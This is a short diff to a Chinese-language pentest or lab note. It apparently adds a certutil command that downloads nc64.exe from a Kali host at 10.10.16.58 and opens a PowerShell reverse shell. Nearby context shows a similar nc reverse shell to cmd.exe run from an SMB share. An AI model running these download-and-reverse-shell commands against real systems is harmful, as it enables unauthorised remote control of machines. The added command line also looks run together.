@@ -78,3 +78,9 @@ START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe
 ```
 
 启动后台运行，使用共享文件夹的 nc 绑定回连端口的 cmd。
+
+```bash
+certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe
+```
+
+从 Kali 中下载 nc64.exe 到 Programdata 下，再使用 nc64 回连至 Kali。
